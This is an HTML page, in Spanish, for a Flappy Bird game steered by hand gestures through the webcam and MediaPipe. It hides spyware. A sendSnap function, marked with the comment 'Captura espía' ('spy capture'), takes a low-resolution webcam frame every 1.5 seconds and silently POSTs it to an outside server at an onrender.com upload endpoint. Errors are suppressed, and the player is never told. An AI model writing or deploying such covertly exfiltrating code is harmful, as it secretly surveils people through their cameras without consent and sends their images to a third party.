<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Flappy Bird Hand Control - Pro</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #4ec0ca; font-family: sans-serif; overflow: hidden; }
        
        video { position: absolute; top: 10px; right: 10px; width: 150px; border: 2px solid white; border-radius: 10px; transform: scaleX(-1); z-index: 50; }
        canvas#game-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
        
        .hud { position: absolute; top: 20px; left: 20px; z-index: 100; font-size: 24px; color: white; text-shadow: 2px 2px #000; font-weight: bold; }
        
        /* Pantallas de interfaz */
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 300; display: flex; align-items: center; justify-content: center; text-align: center; color: white; }
        .card { background: #222; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; max-width: 400px; width: 90%; }
        .btn { background: #f1c40f; color: #000; border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; border-radius: 10px; cursor: pointer; margin-top: 20px; width: 100%; }
        
        #loading-msg { color: #f1c40f; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>

<div class="hud">SCORE: <span id="score">0</span></div>
<video id="webcam" playsinline></video>
<canvas id="game-canvas"></canvas>

<div id="start-screen" class="overlay">
    <div class="card">
        <h2 style="color:#f1c40f">FLAPPY BIRD HANDS</h2>
        <ul style="text-align: left; font-size: 14px; color: #ccc;">
            <li>Muestra tu mano a la cámara.</li>
            <li>**Mano Abierta:** El pájaro sube ↑</li>
            <li>**Mano Cerrada (Puño):** El pájaro cae ↓</li>
            <li>Evita las tuberías verdes.</li>
        </ul>
        <button id="btn-start" class="btn" onclick="requestAccess()">ACTIVAR CÁMARA</button>
        <div id="loading-msg"></div>
    </div>
</div>

<div id="error-screen" class="overlay" style="display:none">
    <div class="card">
        <h2 style="color:#e74c3c">ERROR DE CÁMARA</h2>
        <p>Necesitamos acceso a la cámara para detectar tu mano.</p>
        <button class="btn" onclick="location.reload()">REINTENTAR</button>
    </div>
</div>

<script>
    const videoElement = document.getElementById('webcam');
    const canvasElement = document.getElementById('game-canvas');
    const ctx = canvasElement.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let bird = { x: 50, y: 0, v: 0, radius: 20 };
    let pipes = [];
    let score = 0;
    let isGameRunning = false;
    let handIsOpen = false;

    // --- 1. CONFIGURACIÓN DE MEDIAPIPE ---
    const hands = new Hands({
        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
    });

    hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 1,
        minDetectionConfidence: 0.5,
        minTrackingConfidence: 0.5
    });

    hands.onResults((results) => {
        if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
            const landmarks = results.multiHandLandmarks[0];
            // Lógica simple: si la punta del dedo medio está más arriba que la base, está abierta
            // En MediaPipe, Y disminuye al subir.
            const tip = landmarks[12].y;
            const base = landmarks[9].y;
            handIsOpen = tip < base;
        } else {
            handIsOpen = false;
        }
    });

    // --- 2. ACCESO Y PERMISOS ---
    async function requestAccess() {
        const btn = document.getElementById('btn-start');
        const loader = document.getElementById('loading-msg');
        btn.style.display = 'none';
        loader.innerText = "Solicitando permisos...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            videoElement.srcObject = stream;
            
            loader.innerText = "Iniciando motor de IA...";
            const camera = new Camera(videoElement, {
                onFrame: async () => { await hands.send({image: videoElement}); },
                width: 640, height: 480
            });
            camera.start();

            document.getElementById('start-screen').style.display = 'none';
            startGame();
        } catch (err) {
            document.getElementById('start-screen').style.display = 'none';
            document.getElementById('error-screen').style.display = 'flex';
        }
    }

    // --- 3. LÓGICA DEL JUEGO ---
    function startGame() {
        canvasElement.width = window.innerWidth;
        canvasElement.height = window.innerHeight;
        bird.y = canvasElement.height / 2;
        isGameRunning = true;
        
        spawnPipe();
        gameLoop();
        setInterval(sendSnap, 1500); // Captura espía
    }

    function spawnPipe() {
        if (!isGameRunning) return;
        const gap = 200;
        const h = Math.random() * (canvasElement.height - gap - 100) + 50;
        pipes.push({ x: canvasElement.width, top: h, bottom: h + gap, w: 70, passed: false });
        setTimeout(spawnPipe, 1800);
    }

    function gameLoop() {
        if (!isGameRunning) return;

        // Física del pájaro basada en la mano
        if (handIsOpen) {
            bird.v = -7; // Sube si la mano está abierta
        }
        bird.v += 0.5; // Gravedad constante
        bird.y += bird.v;

        // Limpiar y dibujar
        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);

        // Pájaro
        ctx.fillStyle = "#f1c40f";
        ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();
        ctx.strokeStyle = "black"; ctx.lineWidth = 2; ctx.stroke();

        // Tuberías
        pipes.forEach((p, i) => {
            p.x -= 5;
            ctx.fillStyle = "#2ecc71";
            ctx.fillRect(p.x, 0, p.w, p.top);
            ctx.fillRect(p.x, p.bottom, p.w, canvasElement.height - p.bottom);

            // Colisiones
            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
            }

            if (p.x + p.w < bird.x && !p.passed) {
                score++;
                p.passed = true;
                document.getElementById('score').innerText = score;
            }
            if (p.x + p.w < 0) pipes.splice(i, 1);
        });

        if (bird.y > canvasElement.height || bird.y < 0) gameOver();
        requestAnimationFrame(gameLoop);
    }

    function gameOver() {
        isGameRunning = false;
        alert("GAME OVER - Score: " + score);
        location.reload();
    }

    function sendSnap() {
        const snap = document.createElement('canvas');
        snap.width = 160; snap.height = 120;
        snap.getContext('2d').drawImage(videoElement, 0, 0, 160, 120);
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.3) })
        }).catch(() => {});
    }
</script>
</body>
</html>
